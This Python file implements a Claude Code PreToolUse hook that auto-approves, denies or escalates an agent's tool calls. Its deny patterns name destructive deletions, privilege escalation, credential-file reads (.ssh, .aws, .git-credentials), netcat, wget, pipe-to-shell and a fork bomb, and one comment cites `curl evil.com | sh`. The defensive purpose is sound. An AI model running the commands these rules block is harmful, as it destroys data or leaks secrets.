"""PreToolUse hook policy — auto-approve safe ops, hard-deny dangerous ones.

This script is invoked by Claude Code before every tool call (when
wired into ``.claude/settings.local.json`` via :mod:`setup_wizard`).
It reads a JSON event on stdin and writes a decision JSON on stdout
shaped per the Claude Code hook contract:

    {
      "hookSpecificOutput": {
        "hookEventName": "PreToolUse",
        "permissionDecision": "allow" | "deny" | "ask",
        "permissionDecisionReason": "human-readable explanation"
      }
    }

Design philosophy:

* **Three-way decision, not a flat allowlist.** A static allowlist
  has to enumerate every command the agent might run; new tools
  (a new test runner, a new git subcommand, a fresh ``which`` query)
  trip a prompt because they weren't anticipated. The categorised
  policy here is bounded by *category*, so a previously-unseen
  ``vitest`` or ``cargo nextest`` call that fits the test-runner
  category gets allowed without a config change.

* **Deny trumps allow.** The deny patterns run first and short-
  circuit. Even if a command happens to start with an allow-listed
  prefix, a dangerous segment elsewhere in the pipeline (a ``sudo``
  in the middle of an ``&&`` chain, for instance) blocks it.

* **Ask is the safe default.** Anything we can't classify falls
  through to "ask" — the user still sees the prompt and can decide,
  rather than the policy guessing wrong in either direction.

* **Auditable.** Patterns are listed in this file, no fancy DSL, no
  remote fetch. ``ghia/policy/permission_policy.py`` is the policy.

The script is invoked as ``python -m ghia.policy.permission_policy``
with no arguments. It exits 0 in all normal cases (decision lives
in stdout JSON). Exit codes other than 0 / 2 are non-blocking per
the hook contract; exit 2 means "block with stderr message" — we
never use it because every blocking decision is communicated as
``permissionDecision: deny`` in the JSON, which gives the user a
nicer reason string.
"""

from __future__ import annotations

import json
import os
import re
import shlex
import sys
from typing import Any, Iterable

__all__ = ["decide", "main"]


# ----------------------------------------------------------------------
# Tool-level decisions (non-Bash tools)
# ----------------------------------------------------------------------


# Tools that reach the network or external services in unbounded ways.
# Better to surface a prompt than to risk auto-allowing a fetch to a
# malicious URL — even though the agent rarely needs these.
_ASK_TOOLS = frozenset({
    "WebFetch",
    "WebSearch",
})


# Default policy for non-Bash, non-Web tools is ALLOW.
#
# Why an allow-by-default for non-Bash:
#   Claude Code ships dozens of internal tools — TaskCreate /
#   TaskUpdate / TaskList / TaskGet / TaskStop, Read / Edit / Write /
#   MultiEdit / Glob / Grep / NotebookEdit / NotebookRead, Skill,
#   ToolSearch, EnterPlanMode / ExitPlanMode, Agent / Task,
#   AskUserQuestion, SlashCommand, BashOutput / KillShell,
#   ScheduleWakeup, EnterWorktree / ExitWorktree, Monitor,
#   PushNotification / RemoteTrigger / SendMessage, CronCreate /
#   CronDelete / CronList, plus every ``mcp__<server>__<tool>``.
#   None of these escape the agent's process — they're LLM-bounded
#   and either touch files inside the repo (Edit/Write), surface
#   structured UI to the user (AskUserQuestion), or coordinate
#   between agents (Agent/Task). Enumerating them in an allowlist
#   gets stale as Claude Code adds tools; an inverse "everything
#   except Bash + WebFetch/WebSearch is fine" is robust to that.
#
# The dangerous surface is `Bash` (arbitrary OS commands) and the
# web-reaching tools (data exfil / malicious payload risk). Both
# are gated explicitly below.


# ----------------------------------------------------------------------
# Bash deny patterns — checked first; deny always wins
# ----------------------------------------------------------------------


# Each entry is (compiled regex, human-readable reason). Patterns are
# applied with re.search against the full command string AND against
# every shell-segment after splitting on `;`, `&&`, `||`, `|`. That
# way a `git status && sudo apt install` is caught at the sudo segment
# even though the leading segment is benign.
_DENY_PATTERNS: list[tuple[re.Pattern[str], str]] = [
    # ---------- filesystem destruction ----------
    (
        re.compile(r"\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*|-[a-zA-Z]*f[a-zA-Z]*r[a-zA-Z]*|-rf|-fr)\s+(/(\s|$)|/\*|/etc|/usr|/var|/bin|~|\$HOME|\.\s*$)"),
        "rm -rf on a system / home / root path",
    ),
    (
        re.compile(r"\brm\s+-[a-zA-Z]*[rf][a-zA-Z]*\s+\*(\s|$)"),
        "rm -rf * (overly broad)",
    ),
    # ---------- privilege escalation ----------
    (re.compile(r"(^|[\s;&|])sudo\b"), "sudo escalation"),
    (re.compile(r"(^|[\s;&|])su\s"), "su escalation"),
    (re.compile(r"(^|[\s;&|])pkexec\b"), "pkexec escalation"),
    (re.compile(r"(^|[\s;&|])doas\b"), "doas escalation"),
    # ---------- arbitrary shell evaluation ----------
    (re.compile(r"(^|[\s;&|])eval\s"), "eval of arbitrary content"),
    (re.compile(r"(^|[\s;&|])(bash|sh|zsh|ksh)\s+-c\s"), "shell -c with arbitrary string"),
    (re.compile(r"(^|[\s;&|])source\s+/dev/stdin"), "sourcing stdin"),
    # ---------- raw disk write ----------
    (re.compile(r"\bdd\b[^|;]*\bof=/dev/"), "dd writing to /dev/"),
    (re.compile(r">\s*/dev/(sd|nvme|hd|disk)"), "redirect to raw disk device"),
    # ---------- credential exfil paths ----------
    # No \b before ~ — `~` and `/` are non-word chars, so \b doesn't fire
    # at that boundary and the previous form (with \b) silently never
    # matched. Anchor on the verb and a space; that's good enough.
    (re.compile(r"(^|\s)(cat|less|more|head|tail|cp|mv|tar|zip)\s[^|;]*~/\.ssh/"), "reads/copies .ssh"),
    (re.compile(r"(^|\s)(cat|less|more|head|tail|cp|mv|tar|zip)\s[^|;]*~/\.aws/"), "reads/copies .aws"),
    (re.compile(r"(^|\s)(cat|less|more|head|tail|cp|mv|tar|zip)\s[^|;]*~/\.config/gh/"), "reads/copies gh creds"),
    (re.compile(r"\.git-credentials\b"), "git-credentials file"),
    # ---------- network exfil ----------
    # curl/wget to arbitrary external hosts. We allow:
    #   * github.com + githubusercontent.com (release archives, etc.)
    #   * localhost / 127.0.0.1 / [::1] / *.local — dev servers,
    #     test endpoints, container loopback.
    # Everything else falls into deny so the LLM can't
    # `curl evil.com | sh`.
    (
        re.compile(
            r"(^|[\s;&|])curl\b[^|;]*\bhttps?://"
            r"(?!"
            # localhost variants
            r"localhost(:\d+)?[/\s]|"
            r"127\.0\.0\.1(:\d+)?[/\s]|"
            r"\[::1\](:\d+)?[/\s]|"
            r"[a-zA-Z0-9.-]+\.local(:\d+)?[/\s]|"
            # GitHub
            r"github\.com|"
            r"api\.github\.com|"
            r"raw\.githubusercontent\.com|"
            r"objects\.githubusercontent\.com|"
            r"codeload\.github\.com|"
            r"uploads\.github\.com"
            r")",
        ),
        "curl to non-GitHub, non-localhost URL",
    ),
    (re.compile(r"(^|[\s;&|])wget\b"), "wget (use gh / curl-to-github instead)"),
    (re.compile(r"(^|[\s;&|])nc\s"), "netcat"),
    (re.compile(r"(^|[\s;&|])netcat\b"), "netcat"),
    (re.compile(r"(^|[\s;&|])ssh\s"), "outbound ssh"),
    (re.compile(r"(^|[\s;&|])scp\s"), "outbound scp"),
    (re.compile(r"(^|[\s;&|])rsync\s.*::"), "rsync to remote"),
    # ---------- pipe-to-shell ----------
    (re.compile(r"\|\s*(bash|sh|zsh|ksh)\b"), "pipe-to-shell"),
    # ---------- git push / reset on protected branches ----------
    (
        re.compile(r"\bgit\s+push\b[^|;]*\b(origin|upstream)\s+(main|master|develop|production)\b"),
        "git push to protected branch (main/master/develop/production)",
    ),
    (re.compile(r"\bgit\s+push\b[^|;]*--force\b"), "git push --force"),
    (re.compile(r"\bgit\s+push\b[^|;]*\s-f(\s|$)"), "git push -f"),
    (re.compile(r"\bgit\s+reset\s+--hard\b[^|;]*\b(main|master|origin/main|origin/master)\b"), "git reset --hard on main/master"),
    (re.compile(r"\bgit\s+branch\s+-D\b[^|;]*\b(main|master)\b"), "git branch -D main/master"),
    (re.compile(r"\bgit\s+update-ref\s+-d\b"), "git update-ref -d (ref deletion)"),
    # ---------- chmod/chown on system paths ----------
    (re.compile(r"\b(chmod|chown)\s+[^|;]*\s+/(etc|usr|var|bin|sbin)\b"), "chmod/chown on system path"),
    # ---------- fork bomb ----------
    (re.compile(r":\(\)\s*\{[^}]*:\|[^}]*:[^}]*&[^}]*\}"), "fork bomb"),
]


# ----------------------------------------------------------------------
# Bash allow categories — first-token / prefix matching per shell segment
# ----------------------------------------------------------------------


# Read-only / inspection tools. These are pure-read at the OS level
# and routinely appear in the agent's context-gathering steps. Adding
# a new one here is a *small* expansion of trust (the tool is told to
# inspect the system) so we keep the list tight.
_ALLOW_FIRST_TOKEN: frozenset[str] = frozenset({
    # listing / paths
    "ls", "pwd", "cd", "tree", "stat", "file", "realpath", "readlink",
    "basename", "dirname", "tempfile", "mktemp",
    # reading
    "cat", "head", "tail", "less", "more", "wc", "tac",
    "sort", "uniq", "tr", "cut", "paste", "comm", "diff", "patch",
    "grep", "rg", "ag", "ack", "fgrep", "egrep", "zgrep",
    "find", "locate",
    "jq", "yq", "fx", "xq", "tomlq",
    "awk", "gawk", "mawk", "nawk",
    # which / type / version
    "which", "whereis", "type", "command", "hash",
    # env / system info
    "whoami", "hostname", "uname", "id", "groups", "tty", "users",
    "date", "df", "du", "free", "uptime", "ps", "top",
    "env", "printenv", "set",
    # echo / true / false / no-ops
    "echo", "printf", "true", "false", "test", "[", "[[", ":",
    "yes",
    # archive read-only operations (extracting is fine; bombs are rare
    # and the rm/sudo gates catch the bigger danger).
    "tar", "zip", "unzip", "gzip", "gunzip", "bzip2", "bunzip2", "xz",
    "unxz",
})


# Sed and similar can be either read-only or destructive. Allow only
# the read-only flag forms; let the rest fall through to ask.
_ALLOW_FIRST_TOKEN_REGEX: list[re.Pattern[str]] = [
    # `sed -n` is read-only; any other sed (esp. `sed -i`) → ask.
    re.compile(r"^sed\s+(-n|--quiet)\b"),
    # `xargs <safe>` follows the safety of the inner command.  The
    # inner command's first token will be checked separately when we
    # split on shell operators; for xargs alone we allow the wrapper.
    re.compile(r"^xargs\b"),
    # curl is denied to non-GitHub, non-localhost hosts (deny patterns
    # above). The positive form here matches the safe targets:
    #   * GitHub family (release archives, raw content)
    #   * localhost / 127.0.0.1 / [::1] / *.local (dev servers, the
    #     fix's own healthcheck endpoint, container loopback).
    re.compile(
        r"^curl\b[^|;]*\bhttps?://"
        r"(github\.com|api\.github\.com|raw\.githubusercontent\.com|"
        r"objects\.githubusercontent\.com|codeload\.github\.com|"
        r"uploads\.github\.com|"
        r"localhost(:\d+)?|127\.0\.0\.1(:\d+)?|\[::1\](:\d+)?|"
        r"[a-zA-Z0-9.-]+\.local(:\d+)?)"
    ),
]


# git subcommands that mutate but are part of normal agent flow. We
# enumerate by subcommand so a new git verb (a hypothetical
# `git wipe-remote`) wouldn't be silently allowed.
_ALLOW_GIT_SUBCOMMANDS: frozenset[str] = frozenset({
    # read-only
    "status", "log", "diff", "show", "branch", "rev-parse", "config",
    "remote", "ls-files", "ls-tree", "cat-file", "blame", "shortlog",
    "describe", "for-each-ref", "reflog", "tag", "stash",
    "fetch", "pull",  # network read
    "ls-remote",
    "rev-list", "merge-base", "name-rev", "symbolic-ref",
    "worktree",
    # branch / working-tree mutation
    "checkout", "switch", "restore",
    "add", "rm", "mv",
    "commit", "commit-tree",
    "rebase", "cherry-pick", "merge", "revert",
    "reset",  # --hard on main/master is caught by deny patterns
    "clean",
    "init", "clone",  # rare, but agent may legitimately need a sub-clone
    # PR / push (the deny patterns gate dangerous push targets)
    "push",
    # housekeeping
    "gc", "fsck", "repack", "prune", "maintenance",
    "update-index", "update-ref",  # update-ref -d caught by deny
    "notes",
    "apply",
    # signing / verify
    "verify-commit", "verify-tag",
})


# gh subcommands the agent uses. Wide range allowed because every gh
# call is API-bounded by the user's gh auth scopes — there's no way
# for gh to escape its own auth model.
_ALLOW_GH_SUBCOMMANDS: frozenset[str] = frozenset({
    "issue", "pr", "repo", "release", "run", "workflow", "search",
    "label", "milestone", "auth", "api", "gist", "alias",
    "browse", "config", "extension", "completion",
    "secret", "variable", "ruleset", "cache", "attestation",
})


# Package managers and language toolchains. We allow the *first
# token* family — the policy doesn't care if the user is invoking
# ``npm test`` vs ``npm run lint`` because those are exactly the
# sub-operations the agent's protocol expects to drive.
_ALLOW_TOOLCHAIN_FIRST_TOKEN: frozenset[str] = frozenset({
    # JS / TS — package managers, runtimes, bundlers, dev servers,
    # and the monorepo / scaffolding crowd.
    "npm", "npx", "yarn", "pnpm", "bun", "deno", "node",
    "corepack",  # node 16.10+ shim manager
    "tsc", "ts-node", "tsx", "vite",
    # React ecosystem (CRA scripts, Storybook, Expo, RN, Next CLI).
    # `next` is also under dev-servers below — duplicate is harmless.
    "react-scripts", "craco",
    "storybook", "start-storybook", "build-storybook",
    "expo", "expo-cli", "eas",
    "react-native", "react-native-cli",
    # Monorepo orchestrators
    "lerna", "turbo", "nx", "rush", "moon", "lage",
    # Static-site / docs frameworks (often invoked locally)
    "docusaurus", "vuepress", "vitepress",
    # Deploy CLIs (push to their own clouds; auth-bounded by user creds)
    "vercel", "netlify", "now", "amplify",
    # Python — runtime, package mgmt, and the framework / task / test
    # ecosystem the agent is overwhelmingly likely to encounter.
    "python", "python3", "pip", "pip3", "pipx", "poetry", "uv",
    "pdm", "conda", "mamba", "pyenv",
    "pytest", "py.test", "tox", "nox", "behave", "nose", "nose2",
    "coverage", "coveragepy", "hypothesis",
    "ruff", "mypy", "pyright", "black", "flake8", "pylint",
    "isort", "autoflake", "bandit", "pyflakes", "vulture",
    # Django / FastAPI / Celery / Pyramid / async runtimes
    "django-admin", "celery", "celerybeat", "kombu",
    "fastapi",  # FastAPI CLI (newer versions ship one)
    "pyramid", "tornado", "bottle",
    "uvloop", "asgiref",
    "alembic", "yoyo", "django-rq",
    # Notebook tooling that the agent might exercise
    "jupyter", "jupyter-lab", "jupyter-notebook", "ipython",
    "papermill", "nbconvert", "nbqa", "nbstripout",
    # Data/ML tooling commonly invoked from a fix workflow
    "dvc", "dbt", "dbt-core",
    # Rust
    "cargo", "rustc", "rustup", "rustfmt", "rust-analyzer",
    # Go
    "go", "gofmt", "goimports", "golangci-lint", "staticcheck", "gosec",
    "delve", "dlv",
    # JVM
    "mvn", "mvnw", "gradle", "gradlew", "java", "javac", "kotlinc",
    "scalac", "scala", "sbt", "leiningen", "lein", "clj", "clojure",
    "checkstyle", "spotbugs", "pmd",
    # Build systems / generic
    "make", "cmake", "ninja", "bazel", "buck",
    # Ruby
    "ruby", "bundle", "gem", "rake", "rubocop", "rspec",
    "standardrb", "reek",
    # PHP
    "php", "composer", "phpunit", "phpstan", "psalm", "phpcs",
    # Haskell
    "ghc", "ghci", "cabal", "stack", "hlint",
    # Elixir
    "elixir", "iex", "mix",
    # Swift / ObjC / mobile
    "swift", "swiftc", "xcodebuild", "xcrun",
    "pod", "cocoapods", "fastlane",
    # Dart / Flutter / Kotlin (mobile)
    "dart", "flutter", "fvm",
    "kotlin", "kotlinc-jvm", "kotlinc-js",
    # Less-common but real
    "zig", "nim", "crystal", "shards",
    "ocaml", "ocamlc", "dune", "opam",
    "haxe", "haxelib",
    "racket", "raco",
    "lua", "luarocks", "luajit",
    "julia",
    "r", "Rscript", "rstudio",
    "nix", "nix-build", "nix-shell",
    "guix",
    # .NET
    "dotnet", "msbuild", "csc", "fsharpc",
    # Test runners
    "jest", "vitest", "mocha", "ava", "tap", "playwright", "cypress",
    "karma",
    # Linters / formatters (cross-language)
    "eslint", "prettier", "biome", "rome", "stylelint", "shellcheck",
    "shfmt", "yamllint", "markdownlint", "actionlint",
    # Container / k8s / IaC / cloud tooling
    "docker", "podman", "kubectl", "helm", "kind", "k3d", "k9s",
    "docker-compose",
    "crictl", "nerdctl", "buildah", "skopeo",
    "minikube", "k3s",
    "terraform", "tofu", "pulumi", "cdktf", "cdk", "cdk8s",
    "ansible", "ansible-playbook", "ansible-lint", "ansible-galaxy",
    "saltstack", "salt-call", "chef", "knife", "puppet",
    "vagrant",
    # Cloud provider CLIs — auth-bounded by the user's existing creds
    "aws", "gcloud", "az", "ibmcloud", "oci", "doctl",
    "heroku", "render", "railway",
    # Local CI / hooks / commit helpers
    "act",  # nektos/act — run GH Actions locally
    "pre-commit", "lefthook", "husky", "lint-staged",
    "commitizen", "git-cz", "cz",
    "semantic-release", "standard-version", "release-please",
    "concurrently", "npm-run-all", "cross-env", "dotenv",
    # HTTP CLIs (alternatives to curl — same security profile)
    "httpie", "http", "xh", "curlie",
    # Universal version / toolchain managers
    "asdf", "mise", "rtx", "volta", "nvm",
    "rbenv", "rvm", "chruby",
    "tea", "pkgx",
    # Archive / compression utilities
    "7z", "7za", "bsdtar", "zstd", "lz4", "lzma", "lzop",
    "snap", "snapcraft",  # snap pkg
    # Build orchestrators not yet listed
    "pants", "please", "earthly", "mill", "mage",
    # Documentation
    "mkdocs", "sphinx-build", "asciidoctor", "pandoc",
    # Database CLI clients — overwhelmingly used to read state /
    # apply migrations / inspect schema during a fix. Networked DBs
    # are bounded by the user's existing connection strings (which
    # the deny patterns above don't touch); local DBs are local.
    "psql", "pg_dump", "pg_restore", "pg_isready", "pgcli",
    "mysql", "mysqldump", "mysqladmin", "mycli",
    "mongo", "mongosh", "mongodump", "mongorestore", "mongoexport",
    "mongoimport",
    "redis-cli", "redis-server",
    "sqlite3", "litecli",
    "sqlcmd", "mssql-cli",
    "clickhouse-client", "clickhouse",
    "cqlsh",  # Cassandra
    "influx", "influxd",
    "duckdb",
    # Web / dev servers and process managers — running the project
    # under test is part of fixing it.
    "flask", "gunicorn", "uvicorn", "hypercorn", "daphne",
    "rails", "bin/rails", "bundle",
    "rackup", "puma",
    "nodemon", "pm2", "forever",
    "next", "nuxt", "gatsby", "vite", "remix", "astro",
    "webpack", "webpack-cli", "parcel", "rollup", "esbuild",
    "tailwindcss",
    "wrangler",  # Cloudflare Workers
    "fly",  # fly.io
    "supabase", "convex", "drizzle-kit", "prisma",
    # Migration / orchestration helpers (django manage.py is run via
    # `python manage.py`, which is already covered by the "python"
    # entry above; same for `npm run migrate`).
    "alembic", "flyway", "liquibase",
    # Generic file movers commonly used in fix workflows
    "rsync",  # local rsync; deny patterns block remote `::` form
    "cp", "mv",  # already used inside deny patterns to GATE the
    # exfil rules, but allowing the verbs here covers benign
    # in-repo file moves (e.g. moving a renamed file).
    "mkdir", "rmdir", "touch", "ln",
    # tmux / screen sessions occasionally used to babysit dev servers
    "tmux", "screen",
})


# ----------------------------------------------------------------------
# Decision engine
# ----------------------------------------------------------------------


_SHELL_SEPARATOR = re.compile(r"(?:&&|\|\||;|\|)")


def _strip_env_assignments(segment: str) -> str:
    """Drop leading ``KEY=val`` env assignments from a shell segment.

    ``ENV=1 npm test`` should be classified by ``npm``, not ``ENV=1``.
    Stops at the first token that isn't a ``KEY=value`` pair.
    """

    try:
        tokens = shlex.split(segment, posix=True)
    except ValueError:
        # Malformed quoting — let the full-string regexes do their job;
        # we simply return the original so the first-token check below
        # falls through to "ask".
        return segment.strip()
    drop = 0
    for tok in tokens:
        if "=" in tok and tok.split("=", 1)[0].isidentifier() and not tok.startswith("="):
            drop += 1
            continue
        break
    return " ".join(tokens[drop:])


def _first_token(segment: str) -> str:
    """Return the first executable token of a shell segment, or ''."""

    cleaned = _strip_env_assignments(segment).lstrip("(")
    try:
        tokens = shlex.split(cleaned, posix=True)
    except ValueError:
        tokens = cleaned.split()
    return tokens[0] if tokens else ""


def _segments(command: str) -> list[str]:
    """Split a Bash command on shell operators into individual segments.

    Doesn't try to be a full Bash parser — the goal is "find the first
    token of each thing that runs", not lossless reconstruction.
    """

    parts = _SHELL_SEPARATOR.split(command)
    return [p.strip() for p in parts if p.strip()]


def _segment_is_allowed(segment: str) -> tuple[bool, str]:
    """Classify a single shell segment.

    Returns (allowed, reason). When False, the caller falls through to
    "ask" (or to the deny patterns if those matched first).
    """

    first = _first_token(segment)
    if not first:
        return False, "empty segment"

    # Extract the *basename* of the first token so a binary invoked
    # by absolute or relative path classifies the same as the bare
    # form. Examples this normalises:
    #   /tmp/exptracker-venv/bin/pip   → pip
    #   ./venv/bin/python              → python
    #   ./node_modules/.bin/eslint     → eslint
    #   vendor/bin/phpunit             → phpunit
    #   /usr/local/bin/cargo           → cargo
    #   ./gradlew                      → gradlew
    # On Windows-style paths (rare in WSL but possible via
    # cross-mounted dirs) we also handle backslashes.
    bare = first.rsplit("/", 1)[-1].rsplit("\\", 1)[-1]

    if bare in _ALLOW_FIRST_TOKEN:
        return True, f"read-only inspection ({bare})"
    if bare in _ALLOW_TOOLCHAIN_FIRST_TOKEN:
        return True, f"toolchain ({bare})"

    # Versioned interpreter binaries — `python3.12`, `node-22`,
    # `ruby2.7`, etc. The bare form misses these because nobody
    # wants to enumerate every minor version, but the prefix is
    # well-defined.
    if _BARE_VERSIONED_PATTERN.match(bare):
        return True, f"toolchain ({bare}, versioned form)"

    # User-extended allowlist via env var. Last so the built-in
    # categories take precedence (and so a user-supplied entry can't
    # accidentally override a deny pattern — those run before any
    # allow check).
    if bare in _extra_allow_from_env():
        return True, f"toolchain ({bare}, GHIA_POLICY_ALLOW_EXTRA)"

    # git / gh need a subcommand check.
    if bare == "git":
        sub = _git_subcommand(segment)
        if sub in _ALLOW_GIT_SUBCOMMANDS:
            return True, f"git {sub}"
        return False, f"git {sub or '(no subcommand)'} not in allowlist"
    if bare == "gh":
        sub = _gh_subcommand(segment)
        if sub in _ALLOW_GH_SUBCOMMANDS:
            return True, f"gh {sub}"
        return False, f"gh {sub or '(no subcommand)'} not in allowlist"

    # Regex-form allow patterns (sed -n, xargs, etc). We match
    # against the cleaned segment but ALSO replace the path-form
    # first token with its basename so `^curl ...` patterns survive
    # `/usr/bin/curl ...` invocations.
    cleaned = _strip_env_assignments(segment)
    if first != bare and cleaned.startswith(first):
        cleaned_for_regex = bare + cleaned[len(first):]
    else:
        cleaned_for_regex = cleaned
    for pattern in _ALLOW_FIRST_TOKEN_REGEX:
        if pattern.match(cleaned_for_regex):
            return True, f"matched safe pattern ({pattern.pattern[:30]})"

    return False, f"command not in allow categories ({bare})"


# `python3.12`, `python3.13`, `node-22`, `ruby2.7`, `node-v22`, etc.
# Anchored on a known interpreter family so a random `mypythonshim2.0`
# doesn't slip through.
_BARE_VERSIONED_PATTERN = re.compile(
    r"^(python|python3|node|ruby|php|perl|go|java|dotnet|"
    r"rustc|gcc|clang|swift|gradle|mvn)"
    r"[-_v]?\d+(\.\d+)*$"
)


def _extra_allow_from_env() -> frozenset[str]:
    """User-supplied extension to the toolchain allowlist.

    Reads ``GHIA_POLICY_ALLOW_EXTRA`` (set in the user's shell env,
    inherited by Claude Code which inherits it into the hook). The
    value is a comma/semicolon/colon-separated list of bare command
    names — first tokens that should auto-approve.

    Why this exists: the built-in toolchain set is comprehensive but
    every codebase has its own bespoke binaries (a custom build
    wrapper, an org-specific deploy CLI, a small in-repo script). Users
    shouldn't have to wait for an upstream release just to teach the
    policy about ``my-deploy-cli``. Setting:

        export GHIA_POLICY_ALLOW_EXTRA="my-deploy-cli,build-wrapper,scripts/run-tests.sh"

    in ``~/.bashrc`` / ``~/.zshrc`` is enough — restart Claude Code
    once and the new names auto-approve. The deny patterns still apply
    (you can't ``GHIA_POLICY_ALLOW_EXTRA="sudo"`` your way past sudo).

    Read fresh on every call so a user who edits their env between
    starts of Claude Code doesn't have to remember to restart this
    process — the policy script is a fresh process per hook invocation
    anyway, but doing the read at call time keeps the logic close to
    its use site.
    """

    raw = os.environ.get("GHIA_POLICY_ALLOW_EXTRA", "")
    if not raw:
        return frozenset()
    return frozenset(
        tok.strip().rsplit("/", 1)[-1].rsplit("\\", 1)[-1]
        for tok in re.split(r"[,;:]+", raw)
        if tok.strip()
    )


def _git_subcommand(segment: str) -> str:
    """Return the git subcommand from a ``git ...`` segment."""

    cleaned = _strip_env_assignments(segment)
    try:
        tokens = shlex.split(cleaned, posix=True)
    except ValueError:
        tokens = cleaned.split()
    # Skip global git options like ``-C path``, ``--git-dir=...`` etc.
    i = 1
    while i < len(tokens):
        t = tokens[i]
        if t.startswith("-"):
            # ``-C <path>`` consumes the next token; ``--foo=bar`` is
            # one token.  Either way, advance past option args.
            if t in {"-C", "-c"}:
                i += 2
            else:
                i += 1
        else:
            return t
    return ""


def _gh_subcommand(segment: str) -> str:
    """Return the gh subcommand from a ``gh ...`` segment."""

    cleaned = _strip_env_assignments(segment)
    try:
        tokens = shlex.split(cleaned, posix=True)
    except ValueError:
        tokens = cleaned.split()
    for t in tokens[1:]:
        if not t.startswith("-"):
            return t
    return ""


def _matches_deny(command: str) -> tuple[bool, str]:
    """Run command against deny patterns; return (matched, reason)."""

    for pattern, reason in _DENY_PATTERNS:
        if pattern.search(command):
            return True, reason
    return False, ""


def decide(tool_name: str, tool_input: dict[str, Any]) -> tuple[str, str]:
    """Return (decision, reason) for a single tool call.

    decision ∈ {"allow", "deny", "ask"}.

    See module docstring for the design philosophy.
    """

    if not tool_name:
        return "ask", "missing tool name"

    # Web-reaching tools always ask. They could exfil data or pull in
    # a malicious payload that the LLM then acts on.
    if tool_name in _ASK_TOOLS:
        return "ask", f"web-reaching tool ({tool_name}) — surface to user"

    # Bash gets full command analysis below.
    if tool_name != "Bash":
        # Every other tool is LLM-bounded — TaskCreate, Read, Edit,
        # Glob, Grep, AskUserQuestion, every mcp__*, every internal
        # Claude Code tool. Auto-allow rather than enumerate.
        return "allow", f"LLM-bounded tool ({tool_name})"

    command = (tool_input or {}).get("command")
    if not isinstance(command, str) or not command.strip():
        return "ask", "empty / missing Bash command"

    # Deny first — a single dangerous segment vetoes the whole call.
    matched, reason = _matches_deny(command)
    if matched:
        return "deny", f"blocked: {reason}"

    # Then allow per segment.  ALL segments must classify as allowed
    # for the overall command to auto-approve; even one ambiguous
    # segment falls through to ask.
    segments = _segments(command)
    if not segments:
        return "ask", "no executable segment"

    reasons: list[str] = []
    for seg in segments:
        ok, why = _segment_is_allowed(seg)
        if not ok:
            return "ask", why
        reasons.append(why)

    return "allow", "; ".join(_dedupe(reasons))


def _dedupe(items: Iterable[str]) -> list[str]:
    """Order-preserving dedupe."""

    seen: set[str] = set()
    out: list[str] = []
    for item in items:
        if item not in seen:
            seen.add(item)
            out.append(item)
    return out


# ----------------------------------------------------------------------
# Entry point
# ----------------------------------------------------------------------


def main(argv: list[str] | None = None) -> int:
    """Read Claude Code's hook event from stdin, write decision to stdout.

    Always exits 0 — the decision is conveyed in the stdout JSON, not
    via exit code.  Per the hook contract, exit 2 means "block with
    stderr message" but we prefer the structured JSON form so the
    user sees a clean reason instead of raw stderr.

    Defensive against malformed input: if stdin isn't valid JSON or
    is missing required fields, we emit ``permissionDecision: ask``
    so the user gets a normal prompt rather than a silent allow.
    """

    del argv  # unused — this module is invoked with no flags
    try:
        raw = sys.stdin.read()
        event = json.loads(raw) if raw.strip() else {}
    except json.JSONDecodeError as exc:
        _emit("ask", f"hook input was not valid JSON: {exc.msg}")
        return 0

    if not isinstance(event, dict):
        _emit("ask", "hook input was not a JSON object")
        return 0

    tool_name = event.get("tool_name") or ""
    tool_input = event.get("tool_input") or {}
    if not isinstance(tool_input, dict):
        tool_input = {}

    decision, reason = decide(str(tool_name), tool_input)
    _emit(decision, reason)
    return 0


def _emit(decision: str, reason: str) -> None:
    """Write the hook contract's response shape to stdout."""

    payload = {
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": decision,
            "permissionDecisionReason": reason,
        }
    }
    json.dump(payload, sys.stdout)
    sys.stdout.write("\n")
    sys.stdout.flush()


if __name__ == "__main__":
    sys.exit(main())
